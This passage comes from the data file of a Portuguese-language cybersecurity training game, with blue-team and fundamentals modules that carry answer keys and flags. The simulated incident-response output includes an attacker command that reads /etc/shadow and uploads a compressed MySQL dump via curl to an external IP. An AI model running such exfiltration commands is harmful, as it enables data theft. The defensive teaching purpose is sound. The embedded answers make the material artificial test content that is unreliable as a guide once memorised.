      question:"A ligação periódica de saída para 185.22.7.9:4444 (a reverse shell) corresponde a que tática do MITRE ATT&CK?",
      options:[
        {label:"Command and Control (TA0011)",correct:true,
         explain:"Uma reverse shell que liga a um servidor externo para receber ordens é, por definição, Command and Control."},
        {label:"Reconnaissance (TA0043)",
         explain:"O reconhecimento foi a varredura inicial e o pedido a /dev-notes.html, não a shell de saída."},
        {label:"Exfiltration (TA0010)",
         explain:"A exfiltração seria a saída de dados; aqui o canal serve para controlar o host (C2), não (ainda) para extrair dados."}
      ],
      flag:"FLAG{bl4ck_b0x_l0g_hunt3r}",
      reveal:"Cadeia reconstruída e mapeada: do brute force ao C2. Caso documentado.",
      summary:{tecnica:"Caça e reconstrução em logs",vetor:"auth.log + access.log + IOC + MITRE ATT&CK",ferramentas:"grep, awk, uniq",licao:"As logs contam toda a história. Correlacionar por IP, extrair IOCs e mapear a MITRE transforma eventos soltos num incidente compreensível."}
    }
  ]
},
/* ===================== SOC-03 — INCIDENTE (blue) ===================== */
{
  id:"SOC-03", code:"SOC", title:"Resposta a Incidente", track:"blue", domain:"D4",
  blurb:"Confirmado: um host foi comprometido e há tráfego suspeito capturado. Conduz a resposta — analisa o PCAP, segue o canal de C2, mapeia a MITRE e emite o veredicto final.",
  tags:["PCAP","tshark","C2","Resposta a Incidente","Veredicto"],
  intro:[
    {t:"sys",x:"[ SOC ] Incidente IR-2026-042 aberto. O Tier 2 passou-te a captura de rede do host afetado."},
    {t:"sys",x:"[ SOC ] Analisa o tráfego, confirma o comprometimento e produz o veredicto e as ações de remediação."},
    {t:"warnline",x:"[ SOC ] Preserva as evidências: não alteres a captura original."}
  ],
  steps:[
    {
      type:"command", n:"pcap", short:"PCAP",
      eyebrow:"Fase 01 · Análise de captura",
      title:"Filtrar os pedidos HTTP do PCAP",
      dossier:`<p class="lead">Um <b>PCAP</b> é uma captura de pacotes de rede. O <b>tshark</b> (Wireshark em linha de comandos) permite filtrar e extrair campos para ver rapidamente o que aconteceu.</p>`,
      concepts:[
        {term:"PCAP & tshark",
         body:`O PCAP guarda o tráfego pacote a pacote. <code>tshark -r ficheiro.pcap -Y "filtro"</code> aplica um filtro de exibição; <code>-T fields -e campo</code> extrai colunas específicas.`},
        {term:"Filtrar <span class='cmd'>http.request</span>",status:"comando",gate:true,
         body:`<code>tshark -r captura.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri</code> lista quem pediu o quê.`,
         load:`tshark -r captura.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri`}
      ],
      hint:`tshark -r captura.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri`,
      test:c=>/tshark|tcpdump|wireshark|t._shark/.test(c)&&/pcap|http/.test(c),
      output:()=>[
        {t:"line",x:"10.1.2.69   blog.ipb.local   /wp-login.php"},
        {t:"warnline",x:"10.1.2.69   185.22.7.9       /shell.elf      <- download de binário"},
        {t:"warnline",x:"10.1.2.69   185.22.7.9       /upload?d=dump.sql  <- saída de dados"},
        {t:"sys",x:"O host descarregou um binário e enviou dados para 185.22.7.9."}
      ],
      reveal:"O host descarregou um payload e contactou 185.22.7.9. Segue o canal direto na porta 4444."
    },
    {
      type:"command", n:"stream", short:"C2",
      eyebrow:"Fase 02 · Seguir o canal de C2",
      title:"Extrair os comandos da reverse shell",
      dossier:`<p class="lead">A reverse shell em claro na porta 4444 deixa os comandos visíveis no PCAP. Extrair esse fluxo mostra exatamente o que o atacante fez no host.</p>`,
      concepts:[
        {term:"Tráfego de reverse shell em claro",
         body:`Sem cifra, o canal de C2 revela os comandos digitados. Filtrar por <code>tcp.port==4444</code> e ler o campo de dados reconstrói a sessão do atacante.`,},
        {term:"Extrair o fluxo",status:"comando",gate:true,
         body:`<code>tshark -r captura.pcap -Y "tcp.port==4444" -T fields -e data | xxd -r -p</code> descodifica os bytes para texto legível.`,
         load:`tshark -r captura.pcap -Y "tcp.port==4444" -T fields -e data | xxd -r -p`}
      ],
      hint:`tshark -r captura.pcap -Y "tcp.port==4444" -T fields -e data | xxd -r -p`,
      test:c=>/tshark|tcpdump|wireshark/.test(c)&&/4444/.test(c),
      output:()=>[
        {t:"good",x:"$ id"},
        {t:"line",x:"uid=33(www-data)"},
        {t:"errline",x:"$ cat /etc/shadow"},
        {t:"errline",x:"$ tar czf /tmp/dump.sql.gz /var/lib/mysql && curl -F f=@/tmp/dump.sql.gz http://185.22.7.9/upload"},
        {t:"warnline",x:"Atacante com mãos no teclado: leu credenciais e exfiltrou a base de dados."}
      ],
      reveal:"Comprometimento confirmado com exfiltração. Classifica a atividade e emite o veredicto.",
      flag:null
    },
    {
      type:"choice", n:"tatic", short:"Tática",
      eyebrow:"Fase 03 · Classificação",
      title:"Identificar a tática da exfiltração",
      dossier:`<p class="lead">Distinguir táticas é essencial no relatório: a leitura de <code>/etc/shadow</code> e o envio da base de dados para fora pertencem a fases diferentes da cadeia.</p>`,
      concepts:[
        {term:"Exfiltration vs Collection",
         body:`<b>Collection</b> é juntar os dados (ex.: comprimir a base de dados); <b>Exfiltration</b> é enviá-los para fora (o <code>curl</code> para 185.22.7.9). O upload é, claramente, exfiltração.`}
      ],
      question:"O comando que comprime a base de dados e a envia via curl para 185.22.7.9 corresponde a que tática?",
      options:[
        {label:"Exfiltration (TA0010)",correct:true,
         explain:"Enviar dados recolhidos para um servidor externo controlado pelo atacante é exfiltração."},
        {label:"Initial Access (TA0001)",
         explain:"O acesso inicial já tinha ocorrido (via web/brute force). Esta fase é posterior."},
        {label:"Persistence (TA0003)",
         explain:"Persistência seria garantir acesso futuro (cron, chaves SSH). Aqui o objetivo é tirar dados."}
      ],
      reveal:"Tática identificada. Falta a decisão que fecha o caso.",
      flag:null
    },
    {
      type:"choice", n:"verdict", short:"Veredicto",
      eyebrow:"Fase 04 · Veredicto e remediação",
      title:"Fechar o incidente",
      dossier:`<p class="lead">O veredicto resume o que aconteceu e desencadeia a remediação. Tem de conter a ameaça, remover o acesso do atacante e preservar evidências para a investigação.</p>`,
      concepts:[
        {term:"Ciclo de resposta a incidentes",
         body:`Fases clássicas (NIST): Preparação → Deteção & Análise → Contenção, Erradicação & Recuperação → Lições aprendidas. Confirmado o comprometimento, isola-se, revogam-se credenciais e bloqueiam-se os IOCs.`}
      ],
      question:"Confirmaste comprometimento com exfiltração. Qual é o veredicto e a ação correta?",
      options:[
        {label:"Incidente confirmado: isolar o host da rede, revogar/rodar as credenciais expostas, bloquear os IOCs (203.0.113.66 e 185.22.7.9) e preservar evidências para forense",correct:true,
         explain:"Contenção (isolar), erradicação (revogar credenciais), bloqueio de IOCs e preservação de evidências — a resposta completa e correta."},
        {label:"Falso positivo: fechar o ticket, era só tráfego de manutenção",
         explain:"Há leitura de /etc/shadow e exfiltração confirmada no PCAP — não é, de forma alguma, um falso positivo."},
        {label:"Reiniciar o servidor e continuar a operar normalmente",
         explain:"Reiniciar destrói evidências voláteis e não remove o acesso do atacante nem as credenciais comprometidas."}
      ],
      flag:"FLAG{1nc1d3nt_r3sp0nd3r_pt}",
      reveal:"Incidente IR-2026-042 encerrado com contenção, erradicação e evidências preservadas. Excelente trabalho, analista.",
      summary:{tecnica:"Resposta a incidente (Blue Team)",vetor:"Análise de PCAP + C2 + MITRE + veredicto e remediação",ferramentas:"tshark, xxd",licao:"Confirmar com evidências, conter sem destruir provas, erradicar (rodar credenciais, bloquear IOCs) e documentar. Reiniciar às cegas apaga a história do ataque."}
    }
  ]
}
,
/* ===================== FUND-01 — FUNDAMENTOS (core / D1) ===================== */
{
  id:"FUND-01", code:"CORE", title:"O Vocabulário do Analista", track:"core", domain:"D1",
  blurb:"Antes de atacar ou defender, domina o léxico base da segurança: a tríade CIA, AAA, tipos de controlos, Zero Trust e os fundamentos de criptografia. É a fundação de tudo o resto.",
  tags:["CIA","AAA","Controlos","Zero Trust","Criptografia"],
  intro:[
    {t:"sys",x:"[ ACADEMIA ] Módulo de fundamentos — Domínio 1 do programa (Conceitos Gerais de Segurança)."},
    {t:"sys",x:"[ ACADEMIA ] Sem este vocabulário, todos os outros módulos viram lacunas. Começa por aqui."},
    {t:"warnline",x:"[ ACADEMIA ] Aqui decide-se com a cabeça, não com o terminal: lê o conceito e escolhe a resposta certa."}
  ],
  steps:[
    {
      type:"choice", n:"cia", short:"Tríade CIA",
      eyebrow:"Fase 01 · Princípios fundamentais",
      title:"Identificar a propriedade violada (Tríade CIA)",
      dossier:`<p class="lead">A <b>Tríade CIA</b> é o modelo base da segurança: <b>Confidencialidade</b> (só quem deve, vê), <b>Integridade</b> (os dados não são alterados sem autorização) e <b>Disponibilidade</b> (o serviço está acessível quando preciso).</p>
        <p>Classificar um incidente começa por perceber <i>qual</i> destas três foi atingida.</p>`,
      concepts:[
        {term:"Confidencialidade, Integridade, Disponibilidade",
         body:`<b>Confidencialidade</b>: cifragem, controlo de acesso. <b>Integridade</b>: hashes, assinaturas, controlo de versões. <b>Disponibilidade</b>: redundância, backups, proteção anti-DDoS. Um mesmo evento pode atingir mais do que uma, mas há sempre a propriedade <i>principal</i>.`}
      ],
      question:"Um atacante lança um ataque DDoS que deixa o portal do IPB inacessível durante horas. Que propriedade da tríade CIA é DIRETAMENTE atingida?",
      options:[
        {label:"Disponibilidade",correct:true,
         explain:"O DDoS não rouba nem altera dados — nega o acesso ao serviço. É um ataque à disponibilidade."},
        {label:"Confidencialidade",
         explain:"Não houve exposição de dados; ninguém os leu indevidamente. A confidencialidade mantém-se."},
        {label:"Integridade",
         explain:"Os dados não foram alterados nem corrompidos. O problema é o acesso, não a fiabilidade dos dados."}
      ],
      reveal:"Certo. Agora distingue autenticação de autorização."
    },
    {
      type:"choice", n:"aaa", short:"AAA",
      eyebrow:"Fase 02 · Identidade e acesso",
      title:"Distinguir os três A (AAA)",
      dossier:`<p class="lead"><b>AAA</b> = <b>Autenticação</b> (provar quem és), <b>Autorização</b> (o que podes fazer) e <b>Accounting</b> (registar o que fizeste). Confundir os dois primeiros é um erro clássico.</p>`,
      concepts:[
        {term:"Autenticação vs Autorização vs Accounting",
         body:`<b>Autenticação</b>: password, MFA, biometria — valida a identidade. <b>Autorização</b>: permissões, papéis (RBAC) — define o acesso depois de autenticado. <b>Accounting</b>: logs e auditoria — regista a atividade para responsabilização (non-repudiation).`}
      ],
      question:"Um utilizador faz login com sucesso (password + MFA), mas ao tentar abrir a pasta de RH recebe 'Acesso negado'. Que mecanismo o bloqueou?",
      options:[
        {label:"Autorização — está autenticado, mas não tem permissão para aquele recurso",correct:true,
         explain:"A identidade foi provada (autenticação OK). O bloqueio é de autorização: as permissões não incluem RH."},
        {label:"Autenticação — a password deve estar errada",
         explain:"A autenticação teve sucesso (o login passou). O problema surge depois, no acesso ao recurso."},
        {label:"Accounting — o sistema não registou o acesso",
         explain:"Accounting é o registo/auditoria da atividade, não controla acessos. Não é o que bloqueia o utilizador."}
      ],
      reveal:"Boa. Os controlos de segurança também se classificam — vê como."
    },
    {
      type:"triage", n:"controls", short:"Controlos",
      eyebrow:"Fase 03 · Classificação de controlos",
      title:"Classificar controlos por função",
      dossier:`<p class="lead">Os controlos classificam-se pela <b>função</b>: <b>Preventivo</b> (evita o incidente), <b>Detetivo</b> (descobre que aconteceu), <b>Corretivo</b> (repara depois) e <b>Dissuasor</b> (desencoraja o atacante).</p>
        <p>Reaproveitamos a escala de severidade como mapa de função — escolhe a categoria certa para cada controlo.</p>`,
      concepts:[
        {term:"Categorias funcionais de controlos",
         body:`<b>Preventivo</b>: firewall, MFA, cifragem. <b>Detetivo</b>: IDS, SIEM, revisão de logs. <b>Corretivo</b>: backups/restauro, patch, isolamento pós-incidente. <b>Dissuasor</b>: avisos legais, câmaras visíveis. A defesa em profundidade combina as quatro.`}
      ],
      // SEV reaproveitado: crit=Preventivo, high=Detetivo, med=Corretivo, low=Dissuasor
      alerts:[
        {src:"Firewall que bloqueia portas não usadas",sig:"Impede a ligação antes de ela acontecer",raw:"função: evitar o incidente",sev:"crit",
         why:"Atua ANTES do incidente, impedindo-o. É um controlo preventivo (mapeado a 'Crítico' nesta escala de função)."},
        {src:"SIEM que dispara alerta de força bruta",sig:"Descobre o ataque enquanto decorre",raw:"função: descobrir que aconteceu",sev:"high",
         why:"Não impede — revela. É um controlo detetivo ('Alto' nesta escala de função)."},
        {src:"Restauro de um backup após ransomware",sig:"Repõe o serviço depois do dano",raw:"função: reparar depois",sev:"med",
         why:"Atua DEPOIS, para recuperar. É um controlo corretivo ('Médio' nesta escala de função)."},
        {src:"Aviso 'Sistema monitorizado' no login",sig:"Desencoraja a tentativa",raw:"função: desencorajar",sev:"low",
         why:"Não impede tecnicamente — desencoraja. É um controlo dissuasor ('Baixo' nesta escala de função)."}
      ],
      reveal:"Excelente. Falta o paradigma moderno: Zero Trust."
    },
    {
      type:"choice", n:"ztna", short:"Zero Trust",
      eyebrow:"Fase 04 · Modelo Zero Trust",
      title:"Aplicar o princípio Zero Trust",
      dossier:`<p class="lead"><b>Zero Trust</b> abandona a ideia de 'rede interna confiável'. O lema é <i>"never trust, always verify"</i>: cada pedido é autenticado, autorizado e cifrado, esteja dentro ou fora do perímetro.</p>`,
      concepts:[
        {term:"Never trust, always verify",
         body:`Pilares do Zero Trust: verificação contínua de identidade, <b>menor privilégio</b>, micro-segmentação e assumir que a violação já aconteceu. A localização na rede deixa de conferir confiança automática.`}
      ],
      question:"Numa arquitetura Zero Trust, um servidor já dentro da rede interna pede acesso a uma base de dados. O que acontece?",
      options:[
        {label:"O pedido é autenticado e autorizado na mesma — estar 'dentro' não confere confiança",correct:true,
         explain:"Exato. Zero Trust não confia na localização: cada pedido é verificado, mesmo interno-para-interno."},
        {label:"É permitido automaticamente porque ambos estão na rede interna",
         explain:"Isso é o modelo de perímetro tradicional ('castelo e fosso'), precisamente o que o Zero Trust rejeita."},
        {label:"É bloqueado sempre, porque Zero Trust proíbe tráfego interno",
         explain:"Zero Trust não proíbe — verifica. O acesso é concedido se a identidade e a política o permitirem."}
      ],
      reveal:"Último bloco: criptografia básica. Sabes a diferença entre cifrar e fazer hash?"
    },
    {
      type:"choice", n:"crypto", short:"Cripto",
      eyebrow:"Fase 05 · Fundamentos de criptografia",
      title:"Cifragem vs hashing (e a flag)",
      dossier:`<p class="lead">Erro frequente: tratar <b>hashing</b> e <b>cifragem</b> como o mesmo. <b>Cifrar</b> é reversível com a chave (protege confidencialidade). <b>Hash</b> é unidirecional (protege integridade e guarda passwords).</p>`,
      concepts:[
        {term:"Hash, cifragem simétrica e assimétrica",
         body:`<b>Hash</b> (SHA-256): unidirecional, sem chave — verifica integridade e guarda passwords (com salt). <b>Simétrica</b> (AES): uma chave partilhada, rápida. <b>Assimétrica</b> (RSA): par público/privado — usada para troca de chaves e assinaturas digitais.`}
      ],
      question:"Queres guardar as passwords dos utilizadores na base de dados de forma a que NEM o administrador as consiga ler. Que técnica usas?",
      options:[
        {label:"Hashing com salt (ex.: bcrypt/Argon2) — unidirecional, não reversível",correct:true,
         explain:"Correto. As passwords nunca se cifram (reversível) — fazem-se hash com salt, para que ninguém as recupere, só verifique."},
        {label:"Cifragem simétrica AES com uma chave guardada no servidor",
         explain:"Cifrar é reversível: quem tiver a chave lê as passwords. Para passwords usa-se hashing, não cifragem."},
        {label:"Codificação Base64 das passwords",
         explain:"Base64 não é segurança — é codificação reversível por qualquer um. Nunca protege passwords."}
      ],
      flag:"FLAG{C0R3_CIA_AAA_Z3R0TRUST}",
      reveal:"Fundamentos consolidados.",
      summary:{tecnica:"Fundamentos de segurança (Security+ D1)",vetor:"Tríade CIA · AAA · classificação de controlos · Zero Trust · criptografia",ferramentas:"Conceitos",licao:"Disponibilidade ≠ confidencialidade; autenticação ≠ autorização; hash ≠ cifragem. Zero Trust verifica cada pedido. Este vocabulário sustenta todos os outros módulos."}
    }
  ]
},

/* ===================== ARCH-01 — ARQUITETURA (core / D3) ===================== */
{
  id:"ARCH-01", code:"ARCH", title:"Desenhar a Defesa", track:"core", domain:"D3",
  blurb:"Segurança não é só reagir — é desenhar redes que resistem. Segmentação, DMZ, modelos de controlo de acesso, defesa em profundidade e o modelo de responsabilidade partilhada na cloud.",
  tags:["Segmentação","DMZ","RBAC","Defesa em Profundidade","Cloud"],
  intro:[
    {t:"sys",x:"[ ACADEMIA ] Módulo de arquitetura — Domínio 3 (Arquitetura de Segurança)."},
    {t:"sys",x:"[ ACADEMIA ] Um analista lê diagramas de rede e percebe porque é que um controlo está onde está."},
    {t:"warnline",x:"[ ACADEMIA ] Decisões de desenho: escolhe a opção que reduz o risco sem partir o serviço."}
  ],
  steps:[
    {
      type:"choice", n:"seg", short:"Segmentação",
      eyebrow:"Fase 01 · Segmentação de rede",
      title:"Onde colocar o servidor web público",
      dossier:`<p class="lead">A <b>segmentação</b> divide a rede em zonas isoladas para conter falhas. A <b>DMZ</b> (zona desmilitarizada) aloja serviços expostos à Internet, separando-os da rede interna.</p>`,
      concepts:[
        {term:"DMZ e segmentação",
         body:`Servidores acessíveis do exterior (web, mail) ficam na <b>DMZ</b>, atrás de firewalls, sem acesso direto à LAN interna. Se forem comprometidos, o atacante não salta logo para os dados internos. É contenção por desenho.`}
      ],
      question:"O IPB quer publicar um novo portal web acessível da Internet. Onde o deves colocar na arquitetura?",
      options:[
        {label:"Numa DMZ, isolado da rede interna por firewall",correct:true,
         explain:"Correto. Serviços expostos vivem na DMZ: se forem invadidos, o atacante não alcança diretamente a LAN interna."},
        {label:"Na mesma sub-rede dos servidores de RH e financeiro, por conveniência",
         explain:"Péssimo desenho: um servidor exposto comprometido daria acesso lateral imediato a dados sensíveis."},
        {label:"Diretamente na Internet, sem firewall, para ser mais rápido",
         explain:"Expor sem qualquer filtragem é convite ao ataque. A DMZ existe precisamente para mediar essa exposição."}
      ],
      reveal:"Bom desenho. Agora o controlo de acesso: que modelo escolher?"
    },
    {
      type:"choice", n:"rbac", short:"Modelo de acesso",
      eyebrow:"Fase 02 · Modelos de controlo de acesso",
      title:"Escolher o modelo de controlo de acesso",
      dossier:`<p class="lead">Há vários modelos: <b>RBAC</b> (por papel), <b>ABAC</b> (por atributos), <b>MAC</b> (rótulos obrigatórios, ex.: militar), <b>DAC</b> (o dono decide). A escolha depende da escala e da rigidez exigida.</p>`,
      concepts:[
        {term:"RBAC, ABAC, MAC, DAC",
         body:`<b>RBAC</b>: permissões por função (ex.: 'Enfermeiro', 'Contabilista') — ideal para organizações com papéis bem definidos. <b>ABAC</b>: decide por atributos (hora, local, dispositivo). <b>MAC</b>: rótulos centrais não-alteráveis pelo utilizador. <b>DAC</b>: o proprietário do recurso concede acessos.`}
      ],
      question:"Um hospital tem 2000 funcionários organizados por funções (médicos, enfermeiros, administrativos), cada uma com acessos bem definidos. Que modelo escala melhor?",
      options:[
        {label:"RBAC — atribui permissões a papéis e os utilizadores herdam-nas pela função",correct:true,
         explain:"RBAC brilha quando há papéis claros: geres permissões por função, não utilizador a utilizador. Escala e audita-se bem."},
        {label:"DAC — cada dono de ficheiro decide quem acede",
         explain:"DAC fica caótico e inconsistente a esta escala: permissões dispersas, difíceis de auditar e propensas a erro."},
        {label:"MAC — rótulos de segurança obrigatórios em tudo",
         explain:"MAC é rígido demais para um hospital comum; usa-se em ambientes militares/classificados, não na gestão por funções."}
      ],
      reveal:"Certo. Um só controlo nunca chega — porquê?"
    },
    {
      type:"choice", n:"did", short:"Profundidade",
      eyebrow:"Fase 03 · Defesa em profundidade",
      title:"Camadas de defesa",
      dossier:`<p class="lead"><b>Defesa em profundidade</b>: múltiplas camadas independentes, para que a falha de uma não comprometa o sistema. Nenhum controlo único é infalível.</p>`,
      concepts:[
        {term:"Defesa em profundidade",
         body:`Camadas típicas: firewall de perímetro → segmentação → MFA → cifragem → EDR no endpoint → backups → monitorização SIEM. O atacante tem de furar várias; o defensor só precisa que uma o detete a tempo.`}
      ],
      question:"A empresa só confia numa firewall de perímetro forte como única proteção. Qual é o problema desta abordagem?",
      options:[
        {label:"É um ponto único de falha — furada a firewall, nada mais detém o atacante",correct:true,
         explain:"Exato. Sem camadas internas (segmentação, MFA, EDR, monitorização), um perímetro comprometido expõe tudo de imediato."},
        {label:"Nenhum — uma boa firewall é suficiente para qualquer organização",
         explain:"Nenhuma firewall apanha tudo (phishing, insiders, 0-days passam ao lado). Por isso existe a defesa em profundidade."},
        {label:"O problema é só o custo da firewall",
         explain:"O risco não é financeiro: é depender de uma única camada. A questão é de arquitetura, não de orçamento."}
      ],
      reveal:"Última peça: a cloud muda quem é responsável por quê."
    },
    {
      type:"choice", n:"cloud", short:"Cloud",
      eyebrow:"Fase 04 · Responsabilidade partilhada",
      title:"Responsabilidade partilhada na cloud (e a flag)",
      dossier:`<p class="lead">Na cloud, a segurança é <b>partilhada</b>: o fornecedor protege a infraestrutura ('segurança DA cloud'); o cliente protege os seus dados, identidades e configurações ('segurança NA cloud').</p>`,
      concepts:[
        {term:"Modelo de responsabilidade partilhada",
         body:`Em <b>IaaS</b>, o cliente gere SO, aplicações, dados e acessos; o fornecedor gere hardware e hipervisor. Configurações erradas pelo cliente (ex.: bucket S3 público) são responsabilidade do cliente — causa nº1 de fugas em cloud.`}
      ],
      question:"Uma equipa deixou um armazenamento de objetos (bucket) na cloud configurado como público e dados vazaram. De quem é a responsabilidade?",
      options:[
        {label:"Do cliente — a configuração de acesso aos seus dados é 'segurança NA cloud'",correct:true,
         explain:"Correto. O fornecedor garante a infraestrutura; o cliente é responsável pelas suas configurações, identidades e dados."},
        {label:"Do fornecedor de cloud — ele é que aloja os servidores",
         explain:"O fornecedor protege a infraestrutura, não as tuas configurações. Um bucket público é erro de configuração do cliente."},
        {label:"De ninguém — a cloud é segura por defeito",
         explain:"A cloud não é 'segura por defeito': muitas falhas vêm de más configurações do cliente. A responsabilidade é partilhada e definida."}
      ],
      flag:"FLAG{4RCH_D3F3S4_3M_C4M4D4S}",
      reveal:"Arquitetura defensiva interiorizada.",
      summary:{tecnica:"Arquitetura de segurança (Security+ D3)",vetor:"Segmentação/DMZ · modelos de acesso (RBAC/ABAC/MAC/DAC) · defesa em profundidade · responsabilidade partilhada na cloud",ferramentas:"Desenho de rede",licao:"Isolar o exposto na DMZ, escolher o modelo de acesso à medida da organização, nunca depender de uma só camada, e perceber que na cloud a configuração dos teus dados é tua responsabilidade."}
    }
  ]
},

/* ===================== VULN-01 — GESTÃO DE VULNERABILIDADES (blue / D4) ===================== */
{
  id:"VULN-01", code:"VULN", title:"Gestão de Vulnerabilidades", track:"blue", domain:"D4",
  blurb:"O outro lado das Operações de Segurança: encontrar fraquezas antes do atacante. Faz um scan autenticado, prioriza por CVSS e risco real, e decide a remediação com gestão de patches.",
  tags:["Vulnerability Scan","CVSS","Priorização","Patch Management","Hardening"],
  intro:[
    {t:"sys",x:"[ SOC ] Módulo de gestão de vulnerabilidades — Domínio 4 (Operações de Segurança)."},
    {t:"sys",x:"[ SOC ] Recebeste mandato para avaliar a postura do servidor interno 'srv-app01' e produzir um plano de remediação."},
    {t:"warnline",x:"[ SOC ] Encontrar é fácil; priorizar pelo risco real é o que distingue um analista."}
  ],
  steps:[
    {
      type:"command", n:"scan", short:"Scan",
      eyebrow:"Fase 01 · Análise de vulnerabilidades",
      title:"Correr um scan de vulnerabilidades",
      dossier:`<p class="lead">Um <b>scanner de vulnerabilidades</b> compara os serviços e versões do alvo com bases de dados de falhas conhecidas (CVE). Não explora — sinaliza o que merece atenção.</p>
        <p>Vamos usar os scripts NSE do nmap para uma primeira passagem rápida ao host interno.</p>`,
      concepts:[
        {term:"CVE & scanner de vulnerabilidades",
         body:`Cada falha pública tem um identificador <b>CVE</b> (ex.: CVE-2021-44228). Scanners como Nessus, OpenVAS ou os scripts <code>vuln</code> do nmap cruzam versões detetadas com CVEs e estimam a gravidade.`},
        {term:"Scripts NSE <span class='cmd'>--script vuln</span>",status:"comando",gate:true,
         body:`O nmap traz a categoria de scripts <code>vuln</code>, que testa vulnerabilidades conhecidas nos serviços encontrados. Sintaxe: <code>nmap --script vuln &lt;alvo&gt;</code>.`,
         load:"nmap --script vuln srv-app01"}
      ],
      hint:"nmap --script vuln srv-app01",
      test:c=>/nmap/.test(c)&&/--script/.test(c)&&/vuln/.test(c)&&/srv-app01/.test(c),
      output:()=>[
        {t:"sys",x:"Starting Nmap NSE (vuln) against srv-app01..."},
        {t:"line",x:"PORT     SERVICE   FINDINGS"},
        {t:"errline",x:"443/tcp  https     CVE-2021-44228 Log4Shell (RCE) — CVSS 10.0 · exposto a app pública"},
        {t:"warnline",x:"22/tcp   ssh       OpenSSH 7.4 — CVE de baixo impacto, exige condições raras · CVSS 5.3"},
        {t:"warnline",x:"3306/tcp mysql     MySQL desatualizado — DoS autenticado · CVSS 6.5 · só na rede interna"},
        {t:"sys",x:"21/tcp   ftp       'vuln' do vsftpd — versão já corrigida neste host (provável falso positivo)"},
        {t:"good",x:"[+] Scan concluído. 4 achados para triagem."}
      ],
      reveal:"Quatro achados. Agora classifica cada um pela severidade real."
    },
    {
      type:"triage", n:"cvss", short:"CVSS",
      eyebrow:"Fase 02 · Classificação por CVSS",
      title:"Classificar os achados por severidade",
      dossier:`<p class="lead">O <b>CVSS</b> dá uma pontuação de 0 a 10. Mas o número base não é tudo: o <b>contexto</b> (exposto à Internet? explorável sem autenticação?) ajusta o risco real. Classifica cada achado.</p>`,
      concepts:[
        {term:"Escala CVSS e contexto",
         body:`<b>9.0–10.0</b> Crítico · <b>7.0–8.9</b> Alto · <b>4.0–6.9</b> Médio · <b>0.1–3.9</b> Baixo. Um CVSS alto num serviço exposto e sem autenticação é prioridade máxima; o mesmo número numa máquina isolada pode esperar. E há sempre falsos positivos a descartar.`}
      ],
      alerts:[
        {src:"Log4Shell (CVE-2021-44228)",sig:"RCE não autenticado num serviço HTTPS exposto à app pública",raw:"CVSS 10.0 · exposto · sem auth",sev:"crit",
         why:"RCE remoto, sem autenticação, num serviço exposto. CVSS 10.0 e contexto pior impossível — crítico, remediar já."},
        {src:"MySQL desatualizado",sig:"DoS que exige sessão autenticada, só alcançável na rede interna",raw:"CVSS 6.5 · interno · requer auth",sev:"med",
         why:"Impacto moderado, exige autenticação e está só na rede interna. Médio — remediar no ciclo normal de patches."},
        {src:"OpenSSH 7.4",sig:"Falha de baixo impacto que só dispara em condições raras",raw:"CVSS 5.3 · condições raras",sev:"low",
         why:"Baixo impacto e difícil de explorar na prática. Baixo — registar e tratar quando conveniente."},
        {src:"vsftpd 'vuln'",sig:"Versão já corrigida neste host — assinatura disparou na mesma",raw:"já corrigido · provável FP",sev:"fp",
         why:"O host já tem a correção aplicada; o scanner sinalizou pela versão aparente. Falso positivo — validar e descartar."}
      ],
      reveal:"Triagem feita. Com tempo e equipa limitados, o que tratas primeiro?"
    },
    {
      type:"choice", n:"prio", short:"Prioridade",
      eyebrow:"Fase 03 · Priorização baseada no risco",
      title:"Decidir a ordem de remediação",
      dossier:`<p class="lead">Não dá para corrigir tudo ao mesmo tempo. Prioriza pelo <b>risco real</b> = probabilidade de exploração × impacto. Exposto à Internet + sem autenticação + exploit público = topo da lista.</p>`,
      concepts:[
        {term:"Priorização por risco",
         body:`Risco = ameaça × vulnerabilidade × impacto. Um crítico exposto e com exploit ativo (como o Log4Shell) corrige-se de imediato, mesmo fora do ciclo. Internos e de baixo impacto entram no calendário normal de patches.`}
      ],
      question:"Tens 4 achados mas só equipa para começar por um agora. Qual escolhes?",
      options:[
        {label:"Log4Shell — CVSS 10, exposto à Internet, RCE sem autenticação e com exploit ativo",correct:true,
         explain:"Correto. Máxima probabilidade × máximo impacto. Corrige-se já, mesmo fora do ciclo normal de patches (patch de emergência)."},
        {label:"OpenSSH — porque o SSH é o serviço mais usado pelos administradores",
         explain:"A popularidade do serviço não define o risco. Aquele achado é baixo e difícil de explorar; não é prioridade."},
        {label:"MySQL — por estar numa porta conhecida e fácil de lembrar",
         explain:"Critério irrelevante. O MySQL é médio, interno e exige autenticação. Não passa à frente de um crítico exposto."}
      ],
      reveal:"Prioridade certa. Como aplicas a correção sem partir produção?"
    },
    {
      type:"choice", n:"patch", short:"Remediação",
      eyebrow:"Fase 04 · Gestão de patches",
      title:"Aplicar a remediação com método (e a flag)",
      dossier:`<p class="lead">A remediação não é 'instalar à pressa em produção'. Há um processo: testar o patch, agendar a janela, ter plano de rollback — e, se não houver patch ainda, aplicar um <b>controlo compensatório</b>.</p>`,
      concepts:[
        {term:"Ciclo de patch e controlos compensatórios",
         body:`Fluxo: identificar → testar em ambiente de estágio → agendar janela de manutenção → aplicar com rollback pronto → verificar. Sem patch disponível, mitiga-se com <b>controlo compensatório</b> (regra de WAF, bloqueio de porta, desativar o módulo vulnerável) até existir correção.`}
      ],
      question:"Para o Log4Shell crítico, qual é a abordagem de remediação mais correta?",
      options:[
        {label:"Aplicar já um mitigante compensatório (WAF/desativar o módulo) e agendar o patch testado com plano de rollback",correct:true,
         explain:"Ideal: reduz o risco imediato com um controlo compensatório e corrige em definitivo de forma controlada, sem partir produção."},
        {label:"Instalar o patch diretamente em produção, sem testar, no horário de maior tráfego",
         explain:"Aplicar sem testar e em pico de tráfego arrisca derrubar o serviço. Patches críticos também seguem método e janela."},
        {label:"Ignorar até à próxima auditoria anual",
         explain:"Adiar um crítico exposto com exploit ativo é negligência — é exatamente o que leva a um incidente grave."}
      ],
      flag:"FLAG{VULN_M6MT_R1SK_PR10R}",
      reveal:"Ciclo de gestão de vulnerabilidades dominado.",
